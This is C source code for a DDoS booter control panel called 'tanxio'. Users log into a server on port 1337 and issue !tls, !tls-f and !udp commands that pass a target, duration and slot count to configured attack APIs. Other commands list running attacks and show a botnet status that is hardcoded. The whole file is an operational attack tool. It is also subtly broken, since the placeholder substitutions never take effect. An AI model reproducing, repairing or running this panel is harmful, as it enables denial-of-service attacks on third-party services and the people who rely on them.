#define _POSIX_C_SOURCE 200809L
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <ctype.h>
#include <sys/wait.h>

#define PORT 1337
#define BUFFER_SIZE 4096
#define MAX_USERS 100
#define MAX_METHODS 50

typedef struct {
    char username[64];
    char password[64];
    char role[32];
} User;

typedef struct {
    char name[64];
    char desc[64];
    char api[512];
    char permission[64];
} Method;

typedef struct {
    char username[64];
    char ip[64];
    int port;
    int time;
    char method[64];
    time_t start;
} Attack;

User users[100];
int user_count = 0;

Method methods[50];
int method_count = 0;

Attack attacks[500];
int attack_count = 0;

char local_ip[64];

void get_local_ip() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) {
        strcpy(local_ip, "127.0.0.1");
        return;
    }
    
    struct sockaddr_in google_dns;
    memset(&google_dns, 0, sizeof(google_dns));
    google_dns.sin_family = AF_INET;
    google_dns.sin_addr.s_addr = inet_addr("8.8.8.8");
    google_dns.sin_port = htons(53);
    
    if (connect(sock, (struct sockaddr*)&google_dns, sizeof(google_dns)) == -1) {
        close(sock);
        strcpy(local_ip, "127.0.0.1");
        return;
    }
    
    struct sockaddr_in local_addr;
    socklen_t len = sizeof(local_addr);
    if (getsockname(sock, (struct sockaddr*)&local_addr, &len) == -1) {
        close(sock);
        strcpy(local_ip, "127.0.0.1");
        return;
    }
    
    close(sock);
    strcpy(local_ip, inet_ntoa(local_addr.sin_addr));
}

char* trim(char *str) {
    while(isspace((unsigned char)*str)) str++;
    if(*str == 0) return str;
    char *end = str + strlen(str) - 1;
    while(end > str && isspace((unsigned char)*end)) end--;
    end[1] = '\0';
    return str;
}

void load_users() {
    FILE *fp = fopen("config/users.json", "r");
    if (!fp) {
        printf("\e[1;31m[!] config/users.json not found\e[0m\n");
        return;
    }
    
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    char *content = malloc(fsize + 1);
    fread(content, 1, fsize, fp);
    fclose(fp);
    content[fsize] = 0;
    
    char *p = content;
    while ((p = strstr(p, "\"username\":")) != NULL) {
        p = strchr(p, ':') + 2;
        char *end = strchr(p, '"');
        int len = end - p;
        strncpy(users[user_count].username, p, len);
        users[user_count].username[len] = 0;
        
        p = strstr(p, "\"password\":");
        if (p) {
            p = strchr(p, ':') + 2;
            if (*p == '"') p++;
            end = strchr(p, '"');
            if (!end) end = strchr(p, ',');
            if (!end) end = strchr(p, '}');
            len = end ? end - p : 32;
            strncpy(users[user_count].password, p, len);
            users[user_count].password[len] = 0;
        }
        
        p = strstr(p, "\"role\":");
        if (p) {
            p = strchr(p, ':') + 2;
            if (*p == '"') p++;
            end = strchr(p, '"');
            if (!end) end = strchr(p, ',');
            if (!end) end = strchr(p, '}');
            len = end ? end - p : 32;
            strncpy(users[user_count].role, p, len);
            users[user_count].role[len] = 0;
        } else {
            strcpy(users[user_count].role, "user");
        }
        
        user_count++;
    }
    
    free(content);
}

void load_methods() {
    FILE *fp = fopen("config/methods.json", "r");
    if (!fp) return;
    
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    char *content = malloc(fsize + 1);
    fread(content, 1, fsize, fp);
    fclose(fp);
    content[fsize] = 0;
    
    char *p = content;
    while ((p = strstr(p, "\"name\":")) != NULL && method_count < 50) {
        p = strchr(p, ':') + 2;
        if (*p == '"') p++;
        char *end = strchr(p, '"');
        int len = end - p;
        strncpy(methods[method_count].name, p, len);
        methods[method_count].name[len] = 0;
        
        p = strstr(p, "\"desripsi\":");
        if (p) {
            p = strchr(p, ':') + 2;
            if (*p == '"') p++;
            end = strchr(p, '"');
            len = end ? end - p : 64;
            strncpy(methods[method_count].desc, p, len);
            methods[method_count].desc[len] = 0;
        }
        
        p = strstr(p, "\"api\":");
        if (p) {
            p = strchr(p, ':') + 2;
            if (*p == '"') p++;
            end = strchr(p, '"');
            len = end ? end - p : 512;
            strncpy(methods[method_count].api, p, len);
            methods[method_count].api[len] = 0;
        }
        
        method_count++;
    }
    
    free(content);
}

void load_banner(char *dest, int size) {
    FILE *fp = fopen("assets/tanxio/tanxio", "r");
    if (!fp) {
        strcpy(dest, "");
        return;
    }
    char line[256];
    int offset = 0;
    while (fgets(line, sizeof(line), fp) && offset < size - 100) {
        strcat(dest, "  ");
        strcat(dest, line);
        offset += strlen(line) + 2;
    }
    fclose(fp);
}

void print_banner(int client_fd) {
    char buffer[8192];
    char banner[4096] = {0};
    
    load_banner(banner, sizeof(banner));
    
    int len = sprintf(buffer, "\e[2J\e[H");
    len += sprintf(buffer + len, "\e[41m");
    len += sprintf(buffer + len, "\n%s", banner);
    len += sprintf(buffer + len, "\e[0m");
    len += sprintf(buffer + len, "\n");
    len += sprintf(buffer + len, "  \e[1mUsername: \e[0m");
    
    send(client_fd, buffer, len, 0);
}

void print_logged_in(int client_fd, char *username) {
    char buffer[4096];
    char banner[4096] = {0};
    int len = 0;
    
    load_banner(banner, sizeof(banner));
    
    len += sprintf(buffer + len, "\e[2J\e[H");
    len += sprintf(buffer + len, "\e[41m");
    len += sprintf(buffer + len, "\n%s", banner);
    len += sprintf(buffer + len, "\e[0m");
    len += sprintf(buffer + len, "\n");
    len += sprintf(buffer + len, "  \e[1;32m[✓]\e[0m Login successful as \e[1;35m%s\e[0m\n", username);
    len += sprintf(buffer + len, "\n");
    len += sprintf(buffer + len, "  Type \e[1;35m!help\e[0m for available commands\n");
    len += sprintf(buffer + len, "\n");
    
    send(client_fd, buffer, len, 0);
}

char* get_prompt(char *username) {
    static char prompt[128];
    sprintf(prompt, "\e[1;36m%s\e[0m\e[1;37m@\e[0m\e[1;35mtanxio\e[0m\e[1;37m~\e[0m# ", username);
    return prompt;
}

char* replace_str(char *str, char *old, char *new) {
    static char result[1024];
    char *p = strstr(str, old);
    if (!p) return str;
    
    int prefix_len = p - str;
    strncpy(result, str, prefix_len);
    result[prefix_len] = 0;
    strcat(result, new);
    strcat(result, p + strlen(old));
    return result;
}

void send_http_request(char *api_url, char *result, int result_size) {
    char host[256], path[512];
    int port = 80;
    
    if (strncmp(api_url, "https://", 8) == 0) {
        sscanf(api_url + 8, "%255[^:/]:%d/%511[^\n]", host, &port, path);
        port = 443;
    } else if (strncmp(api_url, "http://", 7) == 0) {
        sscanf(api_url + 7, "%255[^:/]:%d/%511[^\n]", host, &port, path);
    } else {
        sscanf(api_url, "%255[^:/]:%d/%511[^\n]", host, &port, path);
    }
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        strcpy(result, "{\"status\":\"error\",\"message\":\"socket error\"}");
        return;
    }
    
    struct hostent *server = gethostbyname(host);
    if (!server) {
        close(sock);
        strcpy(result, "{\"status\":\"error\",\"message\":\"host not found\"}");
        return;
    }
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    memcpy(&addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
    addr.sin_port = htons(port);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        strcpy(result, "{\"status\":\"error\",\"message\":\"connection failed\"}");
        return;
    }
    
    char request[2048];
    sprintf(request, "GET /%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host);
    
    send(sock, request, strlen(request), 0);
    
    int bytes = recv(sock, result, result_size - 1, 0);
    if (bytes > 0) {
        result[bytes] = 0;
        char *body = strstr(result, "\r\n\r\n");
        if (body) {
            strcpy(result, body + 4);
        }
    } else {
        strcpy(result, "{\"status\":\"error\",\"message\":\"no response\"}");
    }
    
    close(sock);
}

void handle_command(int client_fd, char *username, char *cmd) {
    char buffer[8192];
    int len = 0;
    char *args[10];
    char cmd_copy[512];
    strcpy(cmd_copy, cmd);
    
    char *token = strtok(cmd_copy, " ");
    int argc = 0;
    while (token && argc < 10) {
        args[argc++] = token;
        token = strtok(NULL, " ");
    }
    
    if (strcmp(cmd, "!help") == 0) {
        len += sprintf(buffer + len, "\n");
        len += sprintf(buffer + len, "  \e[1mCommands:\e[0m\n");
        len += sprintf(buffer + len, "\n");
        len += sprintf(buffer + len, "  \e[1;35m!help\e[0m                       Show this help\n");
        len += sprintf(buffer + len, "  \e[1;35m!methods\e[0m                   Show available methods\n");
        len += sprintf(buffer + len, "  \e[1;35m!tls\e[0m <url> <time> <slot>   TLS attack (L7)\n");
        len += sprintf(buffer + len, "  \e[1;35m!tls-f\e[0m <url> <time> <slot>  TLS flood (L7)\n");
        len += sprintf(buffer + len, "  \e[1;35m!udp\e[0m <ip> <port> <time> <slot>  UDP attack (L4)\n");
        len += sprintf(buffer + len, "  \e[1;35m!ongoing\e[0m                  Show running attacks\n");
        len += sprintf(buffer + len, "  \e[1;35m!stop\e[0m <id>                  Stop an attack\n");
        len += sprintf(buffer + len, "  \e[1;35m!bots\e[0m                       Show botnet status\n");
        len += sprintf(buffer + len, "  \e[1;35m!clear\e[0m                     Clear screen\n");
        len += sprintf(buffer + len, "\n");
    }
    else if (strcmp(cmd, "!methods") == 0) {
        len += sprintf(buffer + len, "\n");
        len += sprintf(buffer + len, "  \e[1mAvailable Methods:\e[0m\n");
        len += sprintf(buffer + len, "\n");
        for (int i = 0; i < method_count; i++) {
            len += sprintf(buffer + len, "    \e[1;35m%s\e[0m \e[90m[%s]\e[0m\n", methods[i].name, methods[i].desc);
        }
        len += sprintf(buffer + len, "\n");
    }
    else if (strcmp(cmd, "!bots") == 0) {
        len += sprintf(buffer + len, "\n");
        len += sprintf(buffer + len, "  \e[1mBotnet Status:\e[0m\n");
        len += sprintf(buffer + len, "\n");
        len += sprintf(buffer + len, "  \e[90mStatus:\e[0m \e[1;32mOnline\e[0m\n");
        len += sprintf(buffer + len, "  \e[90mTotal Nodes:\e[0m \e[1;35m20\e[0m\n");
        len += sprintf(buffer + len, "  \e[90mOnline Bots:\e[0m \e[1;35m16\e[0m\n");
        len += sprintf(buffer + len, "\n");
    }
    else if (strcmp(cmd, "!ongoing") == 0) {
        len += sprintf(buffer + len, "\n");
        len += sprintf(buffer + len, "  \e[1mRunning Attacks:\e[0m\n");
        len += sprintf(buffer + len, "\n");
        if (attack_count == 0) {
            len += sprintf(buffer + len, "  \e[90mNo running attacks\e[0m\n");
        }
        for (int i = 0; i < attack_count; i++) {
            int remaining = attacks[i].time - (time(NULL) - attacks[i].start);
            if (remaining > 0) {
                len += sprintf(buffer + len, "  \e[1;35m%d\e[0m  %s  %s:%d  \e[90m%ds remaining\e[0m\n", 
                    i + 1, attacks[i].method, attacks[i].ip, attacks[i].port, remaining);
            }
        }
        len += sprintf(buffer + len, "\n");
    }
    else if (strcmp(cmd, "!clear") == 0) {
        len += sprintf(buffer + len, "\e[2J\e[H");
    }
    else if (strncmp(cmd, "!tls ", 5) == 0 || strncmp(cmd, "!tls-f ", 7) == 0 || strncmp(cmd, "!udp ", 5) == 0) {
        char *method_name;
        char target[512] = {0};
        int time_val = 60, slot_val = 1, port_val = 80;
        
        if (strncmp(cmd, "!tls", 4) == 0) {
            method_name = (cmd[4] == '-') ? "tls-f" : "tls";
            char *p = strchr(cmd, ' ') + 1;
            if (*p == ' ') p++;
            char *space = strchr(p, ' ');
            if (space) {
                strncpy(target, p, space - p);
                sscanf(space + 1, "%d %d", &time_val, &slot_val);
            }
        } else {
            method_name = "udpplain";
            sscanf(cmd + 5, "%s %d %d %d", target, &port_val, &time_val, &slot_val);
        }
        
        for (int i = 0; i < method_count; i++) {
            if (strcmp(methods[i].name, method_name) == 0) {
                len += sprintf(buffer + len, "\n  \e[90mSending attack...\e[0m\n");
                send(client_fd, buffer, len, 0);
                
                char api_url[1024];
                strcpy(api_url, methods[i].api);
                replace_str(api_url, "<<$host>>", target);
                char time_str[32], slot_str[32], port_str[32];
                sprintf(time_str, "%d", time_val);
                sprintf(slot_str, "%d", slot_val);
                sprintf(port_str, "%d", port_val);
                replace_str(api_url, "<<$time>>", time_str);
                replace_str(api_url, "<<$slot>>", slot_str);
                replace_str(api_url, "<<$port>>", port_str);
                
                char result[4096] = {0};
                send_http_request(api_url, result, sizeof(result));
                
                if (strstr(result, "\"status\":\"success\"")) {
                    char *nodes = strstr(result, "\"total_nodes\":");
                    int total = nodes ? atoi(nodes + 14) : 0;
                    
                    len = 0;
                    len += sprintf(buffer + len, "  \e[1;32mSuccessfully sent to %d device(s)\e[0m\n", total);
                    len += sprintf(buffer + len, "\n");
                    
                    if (attack_count < 500) {
                        strcpy(attacks[attack_count].username, username);
                        strcpy(attacks[attack_count].ip, target);
                        strcpy(attacks[attack_count].method, method_name);
                        attacks[attack_count].port = port_val;
                        attacks[attack_count].time = time_val;
                        attacks[attack_count].start = time(NULL);
                        attack_count++;
                    }
                } else {
                    len = sprintf(buffer, "  \e[1;31m[✗] Attack failed\e[0m\n\n");
                }
                break;
            }
        }
    }
    else {
        len += sprintf(buffer + len, "  \e[1;31mUnknown command: %s\e[0m\n", cmd);
    }
    
    send(client_fd, buffer, len, 0);
}

int handle_client(int client_fd, struct sockaddr_in *client_addr) {
    char *client_ip = inet_ntoa(client_addr->sin_addr);
    printf("\e[1;32m[+]\e[0m Connection from %s\n", client_ip);
    
    print_banner(client_fd);
    
    char buffer[BUFFER_SIZE];
    char username[64] = {0}, password[64] = {0};
    int stage = 0;
    
    while (1) {
        int bytes = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
        if (bytes <= 0) break;
        
        buffer[bytes] = 0;
        char *line = strtok(buffer, "\r\n");
        
        while (line) {
            char *input = trim(line);
            
            if (stage == 0 && strlen(input) > 0) {
                strcpy(username, input);
                stage = 1;
                
                int len = sprintf(buffer, "\n  \e[1mPassword: \e[0m");
                send(client_fd, buffer, len, 0);
            }
            else if (stage == 1 && strlen(input) > 0) {
                strcpy(password, input);
                
                int auth_ok = 0;
                for (int i = 0; i < user_count; i++) {
                    if (strcmp(users[i].username, username) == 0 && 
                        strcmp(users[i].password, password) == 0) {
                        auth_ok = 1;
                        break;
                    }
                }
                
                if (auth_ok) {
                    printf("\e[1;32m[+]\e[0m User %s logged in from %s\n", username, client_ip);
                    print_logged_in(client_fd, username);
                    
                    while (1) {
                        send(client_fd, get_prompt(username), strlen(get_prompt(username)), 0);
                        
                        bytes = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
                        if (bytes <= 0) break;
                        buffer[bytes] = 0;
                        
                        line = strtok(buffer, "\r\n");
                        if (line) {
                            char *cmd = trim(line);
                            if (strlen(cmd) > 0) {
                                if (strcmp(cmd, "!logout") == 0) {
                                    break;
                                }
                                handle_command(client_fd, username, cmd);
                            } else {
                                send(client_fd, "\r", 1, 0);
                            }
                        }
                    }
                    break;
                } else {
                    printf("\e[1;31m[-]\e[0m Failed login attempt: %s from %s\n", username, client_ip);
                    int len = sprintf(buffer, "\n  \e[1;31m[✗] Invalid credentials\e[0m\n\n");
                    send(client_fd, buffer, len, 0);
                    
                    memset(username, 0, 64);
                    memset(password, 0, 64);
                    stage = 0;
                    print_banner(client_fd);
                }
            }
            
            line = strtok(NULL, "\r\n");
        }
        
        if (stage == 2) break;
    }
    
    printf("\e[1;33m[-]\e[0m Connection closed: %s\n", client_ip);
    close(client_fd);
    return 0;
}

int main() {
    signal(SIGCHLD, SIG_IGN);
    
    get_local_ip();
    load_users();
    load_methods();
    
    printf("\e[2J\e[H");
    printf("\n");
    printf("  \e[1;35m██████╗  ██████╗ ██████╗ ██████╗      \e[0m\n");
    printf("  \e[1;35m██╔══██╗██╔═══██╗██╔══██╗██╔══██╗     \e[0m\n");
    printf("  \e[1;35m██████╔╝██║   ██║██████╔╝██████╔╝     \e[0m\n");
    printf("  \e[1;35m██╔═══╝ ██║   ██║██╔══██╗██╔══██╗     \e[0m\n");
    printf("  \e[1;35m██║     ╚██████╔╝██║  ██║██║  ██║     \e[0m\n");
    printf("  \e[1;35m╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝     \e[0m\n");
    printf("\n");
    printf("  \e[90m══════════════════════════════════════════════\e[0m\n");
    printf("  \e[90m  IP      :\e[0m \e[1;36m%s\e[0m\n", local_ip);
    printf("  \e[90m  Port    :\e[0m \e[1;36m%d\e[0m\n", PORT);
    printf("  \e[90m  Connect :\e[0m \e[1;35mnc %s %d\e[0m\n", local_ip, PORT);
    printf("  \e[90m══════════════════════════════════════════════\e[0m\n");
    printf("\n");
    printf("  \e[90mMethods:\e[0m %d  \e[90mUsers:\e[0m %d\n", method_count, user_count);
    printf("\n");
    
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        return 1;
    }
    
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);
    
    if (bind(server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");
        return 1;
    }
    
    if (listen(server_fd, 10) < 0) {
        perror("listen");
        return 1;
    }
    
    printf("  \e[1;32m[✓]\e[0m Server listening on port %d\n", PORT);
    printf("\n");
    
    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
        
        if (client_fd < 0) {
            perror("accept");
            continue;
        }
        
        if (fork() == 0) {
            close(server_fd);
            handle_client(client_fd, &client_addr);
            exit(0);
        }
        
        close(client_fd);
    }
    
    return 0;
}
